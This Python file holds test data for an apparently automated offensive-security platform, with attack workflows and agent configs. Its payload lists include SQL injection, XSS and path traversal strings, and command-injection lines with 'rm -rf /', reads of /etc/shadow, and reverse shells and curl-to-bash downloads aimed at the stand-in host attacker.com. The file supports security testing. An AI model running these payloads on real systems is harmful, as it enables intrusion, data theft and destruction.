"""
Test Data for Manus AI Attack Platform Testing
Phase 2: Testing & Quality Assurance
"""

# Test target configurations
TEST_TARGETS = [
    {
        "name": "test_web_app_001",
        "url": "http://testapp.local",
        "ip": "192.168.1.100",
        "type": "web",
        "technology": ["PHP", "Apache", "MySQL"],
        "security_level": "medium",
        "vulnerabilities": ["SQL Injection", "XSS"],
        "expected_behavior": "should be vulnerable to basic web attacks"
    },
    {
        "name": "test_network_001",
        "ip": "192.168.1.200",
        "type": "network",
        "services": ["SSH", "HTTP", "FTP"],
        "security_level": "high",
        "expected_behavior": "should require advanced techniques"
    }
]

# Test agent configurations
TEST_AGENTS = [
    {
        "name": "NmapAgent",
        "type": "reconnaissance",
        "version": "1.0.0",
        "capabilities": ["port_scan", "service_detection", "os_fingerprinting"],
        "resource_usage": {"cpu": 1, "memory": 512},
        "expected_execution_time": 120
    },
    {
        "name": "SQLMapAgent",
        "type": "vulnerability_discovery",
        "version": "1.0.0",
        "capabilities": ["sql_injection_detection", "database_fingerprinting"],
        "resource_usage": {"cpu": 2, "memory": 1024},
        "expected_execution_time": 180
    },
    {
        "name": "SQLInjectionExploiter",
        "type": "exploitation",
        "version": "1.0.0",
        "capabilities": ["sql_injection_exploitation", "data_extraction"],
        "resource_usage": {"cpu": 2, "memory": 2048},
        "expected_execution_time": 300
    }
]

# Test workflow configurations
TEST_WORKFLOWS = [
    {
        "name": "basic_web_attack",
        "description": "Basic web application attack workflow",
        "phases": [
            {
                "name": "Reconnaissance",
                "agents": ["NmapAgent", "WhatWebAgent"],
                "parallel": True,
                "expected_duration": 120
            },
            {
                "name": "Vulnerability Discovery",
                "agents": ["NucleiAgent", "SQLMapAgent"],
                "parallel": True,
                "expected_duration": 180
            },
            {
                "name": "Exploitation",
                "agents": ["SQLInjectionExploiter"],
                "parallel": False,
                "expected_duration": 300
            }
        ],
        "expected_success_rate": 0.7,
        "risk_level": "medium"
    },
    {
        "name": "stealth_attack",
        "description": "Stealthy attack workflow",
        "phases": [
            {
                "name": "Passive Reconnaissance",
                "agents": ["PassiveReconAgent"],
                "parallel": True,
                "expected_duration": 300
            },
            {
                "name": "Target Analysis",
                "agents": ["TargetAnalyzerAgent"],
                "parallel": False,
                "expected_duration": 240
            }
        ],
        "expected_success_rate": 0.5,
        "risk_level": "low"
    }
]

# Performance test configurations
PERFORMANCE_TEST_CONFIG = {
    "concurrent_users": [10, 50, 100],
    "test_duration": 60,  # seconds
    "warmup_time": 10,  # seconds
    "ramp_up_time": 30,  # seconds
    "expected_response_time_p95": 100,  # ms
    "expected_throughput": 1000,  # req/s
    "error_rate_threshold": 0.01  # 1%
}

# Security test configurations
SECURITY_TEST_CONFIG = {
    "sql_injection_payloads": [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1#",
        "' or 1=1--",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or '1'='1#",
        "') or '1'='1/*",
        "admin' or '1'='1",
        "admin' or '1'='1'--",
        "admin' or '1'='1'#",
        "admin' or '1'='1'/*"
    ],
    "xss_payloads": [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<iframe src=javascript:alert('xss')>",
        "<object data=javascript:alert('xss')>",
        "<embed src=javascript:alert('xss')>",
        "<link rel=stylesheet href=javascript:alert('xss')>",
        "<style>body{background:url('javascript:alert(\"xss')')}</style>",
        "<base href='javascript:alert('xss')//'>"
    ],
    "command_injection_payloads": [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc attacker.com 4444",
        "`cat /etc/shadow`",
        "$(whoami)",
        "; wget http://attacker.com/malware.sh",
        "&& curl -s http://attacker.com/steal.sh | bash",
        "| python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        "&& python -c 'exec(\"\"\"import urllib2;print urllib2.urlopen(\\\"http://attacker.com\\\".read())\"\"\")'"
    ],
    "path_traversal_payloads": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%u2215..%u2215..%u2215etc%u2215passwd",
        "/etc/passwd",
        "/windows/system32/config/sam",
        "../../../windows/system32/config/sam",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam"
    ]
}

# Authentication test configurations
AUTH_TEST_CONFIG = {
    "valid_tokens": [
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.valid.signature",
        "Bearer sk-1234567890abcdef1234567890abcdef",
        "Bearer test_token_12345_valid"
    ],
    "invalid_tokens": [
        "Bearer invalid_token",
        "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
        "Bearer sk-invalid-token",
        "invalid_format",
        "",
        "Basic dGVzdDp0ZXN0",
        "Bearer ",
        "Token invalid_token"
    ],
    "rate_limit_settings": {
        "requests_per_minute": 100,
        "requests_per_hour": 1000,
        "burst_limit": 10,
        "block_duration": 300  # seconds
    }
}

# Database test configurations
DATABASE_TEST_CONFIG = {
    "test_databases": [
        {
            "name": "test_manus_db",
            "type": "postgresql",
            "host": "localhost",
            "port": 5432,
            "username": "test_user",
            "password": "test_password",
            "database": "manus_test"
        }
    ],
    "test_tables": [
        "agents",
        "attacks",
        "results",
        "users",
        "audit_log"
    ],
    "test_data_size": {
        "agents": 50,
        "attacks": 100,
        "results": 500,
        "users": 10,
        "audit_log": 1000
    }
}

# API test configurations
API_TEST_CONFIG = {
    "base_url": "http://localhost:8000",
    "test_endpoints": [
        "/api/v1/agents",
        "/api/v1/attacks",
        "/api/v1/status",
        "/api/v1/workflows",
        "/health",
        "/ready"
    ],
    "test_headers": {
        "Content-Type": "application/json",
        "Authorization": "Bearer test_token"
    },
    "timeout_settings": {
        "connection_timeout": 10,
        "read_timeout": 30,
        "write_timeout": 30
    }
}

# Test environment settings
TEST_ENVIRONMENT = {
    "coverage_target": 85,
    "performance_targets": {
        "api_response_time_p95": 100,
        "throughput": 1000,
        "concurrent_users": 100,
        "memory_limit": 2048,
        "cpu_limit": 70
    },
    "test_data_dir": "tests/test_data",
    "report_dir": "tests/reports",
    "max_test_duration": 300,
    "parallel_execution": True,
    "max_workers": 4,
    "cleanup_after_tests": True
}